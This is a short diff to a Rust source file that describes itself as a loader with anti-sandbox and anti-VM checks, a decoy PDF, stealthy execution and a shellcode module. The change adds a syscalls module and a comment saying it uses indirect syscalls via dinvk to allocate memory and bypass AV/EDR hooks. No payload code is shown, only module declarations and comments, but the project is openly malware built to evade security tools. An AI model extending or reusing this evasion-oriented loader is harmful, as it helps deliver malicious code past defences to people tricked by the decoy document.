@@ -9,12 +9,14 @@
 //! - Anti-sandbox/Anti-VM checks
 //! - Displaying a decoy PDF
 //! - Stealthy execution
+//! - INDIRECT SYSCALLS via dinvk for memory allocation (bypasses AV/EDR hooks)
 
 #![cfg_attr(feature = "production", windows_subsystem = "windows")]
 
 mod config;
 mod evasion;
 mod shellcode;
+mod syscalls;
 
 use std::thread;
 use std::time::Duration;
